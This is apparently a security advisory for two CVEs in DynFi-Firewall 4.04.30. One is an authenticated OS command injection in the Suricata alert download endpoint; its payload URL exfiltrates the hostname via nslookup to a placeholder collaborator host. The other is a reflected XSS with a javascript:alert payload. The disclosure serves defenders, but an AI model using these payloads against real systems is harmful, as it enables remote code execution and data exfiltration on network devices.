
CVE-2025-50968

DynFi-Firewall 4.04.30 contains an authenticated OS command injection vulnerability in its Suricata alert download endpoint. An administrator can supply arbitrary shell metacharacters via the if parameter (e.g. if=vtnet0&nslookup $(uname -n).<COLLABORATOR>&'\"), which is passed unchecked into a system call. This allows execution of arbitrary commands on the firewall with the same privileges as the web service (typically root or highly privileged). Exploitation can lead to full remote code execution, data exfiltration, or lateral movement within the network. The root cause is the lack of input validation and improper escaping of user-controlled data in backend command invocation.

Vulnerability: OS Command Injection / RCE

Version: ```DynFi-Firewall-4.04.30```

Authenticated: ```Yes```

User: ```Administrator Level```

Vulnerable Parameter: 
```if```

Payload:

```Replace with your collaborator```

```http://192.168.124.34/ui/suricata/alerts/download?if=vtnet0%26nslookup%20$(uname%20-n).<REPLACE ME>.&%27%5C%22```

Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/DynFi-Firewall-4.04.30-RCE-via-if-parameter.gif?raw=true)






CVE-2025-50969




Vulnerability: Reflected XSS

Version: ```DynFi-Firewall-4.04.30```

Authenticated: ```Yes```

User: ```Administrator Level```

Vulnerable Parameter: 
```if```

Payload:
```http://192.168.124.34/firewall_rules_edit.php?if=%27%3bjavascript:alert(123)%2f%2f```

Requires Interaction: ```Yes```

Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/DynFi-Firewall-4.04.30-Reflected-XSS-via-if-parameter.gif?raw=true)
